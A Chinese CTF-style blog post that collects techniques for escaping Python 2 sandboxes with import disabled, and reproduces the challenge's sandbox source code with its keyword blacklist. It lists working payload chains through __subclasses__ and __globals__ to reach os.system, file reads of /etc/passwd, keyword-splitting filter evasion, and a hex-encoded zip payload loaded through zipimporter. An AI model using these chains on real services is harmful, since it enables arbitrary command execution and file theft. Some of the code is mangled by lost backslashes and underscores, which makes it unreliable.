> 原文链接: https://www.anquanke.com//post/id/107000 


# 禁用import的情况下绕过python沙箱


                                阅读量   
                                **201973**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">5</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01aa5b30e724024e08.png)](https://p2.ssl.qhimg.com/t01aa5b30e724024e08.png)

> 本文总结一些python沙盒在禁用了`import`,`__import__` ,无法导入模块的情况下沙盒绕过的一些方法, 国赛上出了一道python沙盒的题,做了一天没做出来, 让我知道我对python一无所知, 于是总结了一篇文章,大佬勿喷.



## basic
1. 在Python里，这段`[].__class__.__mro__[-1].__subclasses__()`魔术代码，不用import任何模块，但可调用任意模块的方法。
2 查看Python版本

```
Python2.x和Python3.x有一些区别，Bypass前最好知道Python版本。

我们知道，sys.version可以查看python版本。

&gt;&gt;&gt; import sys
&gt;&gt;&gt; sys.version
'2.7.10 (default, Oct 23 2015, 19:19:21) n[GCC 4.2.1 Compatible Apple LLVM 7.0.0 (

```
1. 查看当前内存空间可以调用的函数
```
print __builtins__
dir()
dir(__builtins__)
```

### 

## trick1

内置函数,可以通过`dir(__builtins__)` 看看有哪些内置函数可以利用的.

```
eval: eval('import("os").system("ls")')

input: import('os').system('ls')

open,file: file('/etc/passwd').read() open('/etc/passwd').read()

exec : exec("__import__('os').system('ls')");

execfile: 加载文件进内，相当于from xx import *

execfile('/usr/lib/python2.7/os.py')  system('ls')

map　回调函数

map(os.system,['ls'])
```

### 

## trick2

`__globals__` ：该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os,sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用`__globals__`　属性访问全局的变量

```
&gt;&gt;&gt; a = lambda x:x+1
&gt;&gt;&gt; dir(a)
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
&gt;&gt;&gt; a.__globals__
`{`'__builtins__': &lt;module '__builtin__' (built-in)&gt;, '__name__': '__main__', '__doc__': None, 'a': &lt;function &lt;lambda&gt; at 0x7fcd7601ccf8&gt;, '__package__': None`}`
&gt;&gt;&gt; a.func_globals
`{`'__builtins__': &lt;module '__builtin__' (built-in)&gt;, '__name__': '__main__', '__doc__': None, 'a': &lt;function &lt;lambda&gt; at 0x7f1095d72cf8&gt;, '__package__': None`}`
(lambda x:1).__globals__['__builtins__'].eval("__import__('os').system('ls')")
```

我们看到`__globals__` 是一个字典，默认有`__builtins__`对象,另外func**globals和`<em>_globals**</em>`　作用一样

在python sandbox中一般会过滤`__builtins__`内容，这样**globals**里面的`__builtins__`也就没有什么意义了,即使重新`import __builtin__` 还是一样.

#### 

## 2.1 执行系统命令

在python2.7.10里，<br>`[].class.base.subclasses()` 里面有很多库调用了我们需要的模块os

```
/usr/lib/python2.7/warning.py
58  &lt;class 'warnings.WarningMessage'&gt;
59  &lt;class 'warnings.catch_warnings'&gt;

/usr/lib/python2.7/site.py
71  &lt;class 'site._Printer'&gt;
72  &lt;class 'site._Helper'&gt;
76  &lt;class 'site.Quitter'&gt;
```

我们来看一下`/usr/lib/python2.7/warning.py`导入的模块

```
import linecache
import sys
import types
```

跟踪linecache文件`/usr/lib/python2.7/linecache.py`

```
import sys
import os
```

OK,调用了os,可以执行命令，于是一个利用链就可以构造了:

```
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('ls')
[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].system('ls')
```

> **dict**和**globals**都是字典类型，用[]键值对访问，也可以通过values(),keys()这样的方法来转换成list,通过下标来访问

还要大佬给了一个不需要利用`__globals__`就可以执行命令的payload：

```
[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system('ls')
```

我们来在来看一下`/usr/lib/python2.7/site.py`导入的模块

```
import sys
import os
import __builtin__
import traceback
```

直接构造:

```
[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].system('ls')
```

### 

### 2.2 禁用了**globals**如何绕过

在今年国赛上有一道run的沙盒绕过的题目,白名单过滤了`import` 导入的内容, 禁用了ls,即`__globals__` 用不了了,想了很多其他方式都没有绕过去,赛后才知道的方法,这里也写一下

绕过方法就是利用类的一些描述器方法

`__getattribute__`:

当访问 某个对象的属性时，会无条件的调用这个方法。比如调用`t.__dict__`,其实执行了`t.__getattribute__("__dict__")`函数, 这个方法只适用于新式类。<br>
新式类就是集成自object或者type的类。

于是我们就可以利用`__init__.__getattribute__('__global'+'s__')` 拼接字符串的方法来绕过ls的关键字 而不是直接调用`__init__.__globals__`

最终的payload为:

```
print [].__class__.__mro__[-1].__subclasses__()[71].__init__.__getattribute__('__global'+'s__')['o'+'s'].__dict__['sy'+'stem']('ca'+'t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb')
```

有点不明白的就是下面这条命令执行不了,不知道为什么,本机上是可以执行的,不然也是完全可以绕过所有关键字的.

```
[].__class__.__base__.__subclasses__()[59]()._module.linecache.__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s')
```

> 还有两个描述器方法和这个方法类似,但还是有区别的

`__getattr__`: 只有**getattribute**找不到的时候,才会调用**getattr**.

`__get__`: 当函数被当作属性访问时，它就会把函数变成一个实例方法。

run这题的源码如下,有兴趣的可以研究一下

sandbox.py

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2018-04-09 23:30:58
# @Author  : Xu (you@example.org)
# @Link    : https://xuccc.github.io/
# @Version : $Id$

from sys import modules
from cpython import get_dict
from types import FunctionType

main  = modules['__main__'].__dict__
origin_builtins = main['__builtins__'].__dict__

def delete_type():
    type_dict = get_dict(type)
    del type_dict['__bases__']
    del type_dict['__subclasses__']

def delete_func_code():
    func_dict = get_dict(FunctionType)
    del func_dict['func_code']

def safe_import(__import__,whiteList):
    def importer(name,globals=`{``}`,locals=`{``}`,fromlist=[],level=-1):
        if name in whiteList:
            return __import__(name,globals,locals,fromlist,level)
        else:
            print "HAHA,[%s]  has been banned~" % name
    return importer

class ReadOnly(dict):
    """docstring for ReadOnlu"""
    def __delitem__(self,keys):
        raise ValueError(":(")        
    def pop(self,key,default=None):
        raise ValueError(":(")        
    def popitem(self):
        raise ValueError(":(")        
    def setdefault(self,key,value):
        raise ValueError(":(")        
    def __setitem__(self,key,value):
        raise ValueError(":(")        
    def __setattr__(self, name, value):
        raise ValueError(":(")
    def update(self,dict,**kwargs):
        raise ValueError(":(")        

def builtins_clear():
    whiteList = "raw_input  SyntaxError   ValueError  NameError  Exception __import__".split(" ")
    for mod in __builtins__.__dict__.keys():
        if mod not in whiteList:
            del __builtins__.__dict__[mod]

def input_filter(string):
    ban = "exec eval pickle os subprocess input sys ls cat".split(" ")
    for i in ban:
        if i in string.lower():
            print "`{``}` has been banned!".format(i)
            return ""
    return string

# delete_type();
del delete_type
delete_func_code();del delete_func_code
builtins_clear();del builtins_clear


whiteMod = []
origin_builtins['__import__'] = safe_import(__import__,whiteMod)
safe_builtins = ReadOnly(origin_builtins);del ReadOnly
main['__builtins__'] = safe_builtins;del safe_builtins

del get_dict,modules,origin_builtins,safe_import,whiteMod,main,FunctionType
del __builtins__, __doc__, __file__, __name__, __package__

print """
  ____                  
 |  _  _   _ _ __      
 | |_) | | | | '_      
 |  _ &lt;| |_| | | | |    
 |_| _\__,_|_| |_|    


Escape from the dark house built with python :)

Try to getshell then find the flag!

"""

while 1:
    inp = raw_input('&gt;&gt;&gt;')
    cmd = input_filter(inp)
    try:
        exec cmd 
    except NameError, e:
        print "wow something lose!We can't find it !  D:"
    except SyntaxError,e:
        print "Noob! Synax Wrong! :("
    except Exception,e:
        print "unknow error,try again  :&gt;"
```

cpython

```
from ctypes import pythonapi,POINTER,py_object

_get_dict = pythonapi._PyObject_GetDictPtr
_get_dict.restype = POINTER(py_object)
_get_dict.argtypes = [py_object]

del pythonapi,POINTER,py_object

def get_dict(ob):
    return _get_dict(ob).contents.value
```

#### 

## trick3: 调用file函数读写文件

```
().__class__.__mro__[-1].__subclasses__()[40]("/etc/passwd").read() //调用file子类
().__class__.__mro__[-1].__subclasses__()[40]('/tmp/1').write("11") //写文件
```

#### <a class="reference-link" name="trick4:%20zipimport.zipimporter"></a>trick4: zipimport.zipimporter

```
55  &lt;type 'zipimport.zipimporter'&gt;
```

我们查看zipimport的帮助手册，发现有个load_module函数，可以导入相关文件到内存中

```
|  load_module(...)
     |      load_module(fullname) -&gt; module.
     |      
     |      Load the module specified by 'fullname'. 'fullname' must be the
     |      fully qualified (dotted) module name. It returns the imported
     |      module, or raises ZipImportError if it wasn't found.
```

于是我们可以先制作一个包含payload的zip文件:

```
import os
print os.system('cat *')
```

利用file函数写入zip到`/tmp/`目录下，然后再调用zipimport.zipimporter导入zip文件中的内容到内存,构造利用链如下:

```
v = ().__class__.__mro__[-1].__subclasses__()
a = "x50x4bx03x04x14x03x00x00x08x00xcexadxa4x42x5ex13x60xd0x22x00x00x00x23x00x00x00x04x00x00x00x7ax2ex70x79xcbxccx2dxc8x2fx2ax51xc8x2fxe6x2ax28xcaxccx03x31xf4x8ax2bx8bx4bx52x73x35xd4x93x13x4bx14xb4xd4x35xb9x00x50x4bx01x02x3fx03x14x03x00x00x08x00xcexadxa4x42x5ex13x60xd0x22x00x00x00x23x00x00x00x04x00x00x00x00x00x00x00x00x00x20x80xa4x81x00x00x00x00x7ax2ex70x79x50x4bx05x06x00x00x00x00x01x00x01x00x32x00x00x00x44x00x00x00x00x00"
v[40]('/tmp/z','wb').write(a)
v[55]('/tmp/z').load_module('z')
```

缺点: 需要导入zlib库，如果无法导入的话，该方法失效



## 参考

[https://zolmeister.com/2013/05/escaping-python-sandbox.html](https://zolmeister.com/2013/05/escaping-python-sandbox.html)

[https://mp.weixin.qq.com/s?__biz=MzIzOTQ5NjUzOQ==&amp;mid=2247483665&amp;idx=1&amp;sn=4b18de09738fdc5291634db1ca2dd55a](https://mp.weixin.qq.com/s?__biz=MzIzOTQ5NjUzOQ==&amp;mid=2247483665&amp;idx=1&amp;sn=4b18de09738fdc5291634db1ca2dd55a)
